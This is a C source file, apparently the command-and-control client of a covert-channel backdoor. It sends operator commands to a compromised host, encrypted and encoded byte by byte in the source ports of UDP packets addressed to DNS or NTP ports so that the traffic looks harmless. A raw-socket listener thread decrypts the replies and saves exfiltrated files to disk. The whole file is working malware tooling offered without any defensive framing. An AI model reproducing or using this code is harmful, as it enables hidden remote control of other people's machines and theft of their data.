#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

#include "client.h"
#include "defs.h"
#include "util.h"
#include "covert.h"
#include "inet.h"

int closing;
int channel;

void backdoor_client(uint32 ipaddr, int chan)
{
	char command[MAX_LEN];
	pthread_t list_thread;

	channel = chan;

	if (ipaddr == 0)
		error("Invalid IP specified.");

	closing = 0;
	pthread_create(&list_thread, NULL, listen_thread, &ipaddr);
	
	printf("Ready, awaiting your command...\n");
	while(fgets(command, MAX_LEN, stdin) != NULL)
	{
		char *trans;
		int tot_len;

		tot_len = strlen(command) + 1;

		trans = buildTransmission(command, &tot_len, CMD_TYP);

		for (int i = 0; i < tot_len; i += 8)
		{
			char frame[FRAM_SZ];
			char *ptr;
			int fram_len;
			uint16 src_port = 0;
			uint16 dst_port = 0;

			ptr = trans + i;

			fram_len = (tot_len - i > 8) ? FRAM_SZ : tot_len - i;

			memcpy(frame, ptr, fram_len);

			encrypt(SEKRET, frame, FRAM_SZ);

			for (int j = 0; j < FRAM_SZ; ++j)
			{
				uint8 byte = frame[j];
				src_port = 0xFF00 & SIGNTR << 8;
				src_port += byte;
				if (channel == CHAN_DNS)
					dst_port = PORT_DNS;
				else
					dst_port = PORT_NTP;

				usleep(SLEEP_TIME);
				_send(ipaddr, src_port, dst_port, channel);
			}
		}

		free(trans);
	}	

	// Listen thread cleanup
	closing = 1;
	pthread_join(list_thread, NULL);
}

void *listen_thread(void *arg)
{
	int sock;
	static char buf[MAX_LEN];
	static int buf_len = 0;
	uint32 ipaddr = *(uint32*)arg;

	sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
	if(sock < 0)
		error("unable to open listening raw socket");

	while(!closing)
	{
		char packet[MAX_LEN];
		char *ptr = 0;
		char *data;
		char type;
		uint32 *ip;

		read(sock, &packet, MAX_LEN);

		// Step 2: check IP address
		ip = ((uint32*)packet) + 3;
		if (*ip != ipaddr)
			continue;

		// Step 3: Check Channel Type
		switch(channel)
		{
			case CHAN_UDP:
				ptr = (char *)(packet + UDP_SIG);
				break;
			case CHAN_NTP:
				ptr = (char *)(packet + NTP_SIG);
				break;
			case CHAN_DNS:
				ptr = (char *)(packet + DNS_SIG);
				break;
		}

		// Step 4: check for signature
		if (*ptr != (char)SIGNTR)
			continue;
		
		// Step 5: Point to 2nd Byte
		++ptr;

		// Step 6: Decrypt and extract
		data = buf + buf_len;
		memcpy(data, ptr, 1);
		buf_len += 1;

		if (buf_len % FRAM_SZ != 0) // Check for frame
			continue;
		
		data -= FRAM_SZ - 1;

		decrypt(SEKRET, data, FRAM_SZ);

		// Step 7: see if we have a full transmission
		data = getTransmission(buf, &buf_len, &type);
		if (data == NULL)
			continue;

		// Step 8: show the results
		if (type == RSP_TYP)
		{
			printf("%s", data);
		}
		else if (type == XFL_TYP)
		{
			char fname[MAX_LEN];
			FILE* file;
			uint64 timestamp;

			timestamp = get_sec();
			sprintf(fname, "%llX", timestamp);
			file = open_file(fname, TRUE);

			printf("%s", data);
			fwrite(data, buf_len, 1, file);

			fclose(file);
		}

		// Step 9: reset buffer
		memset(buf, 0, MAX_LEN);
		memset(packet, 0, MAX_LEN);
		buf_len = 0;
		free(data);
		data = 0;
	}

	return NULL;
}
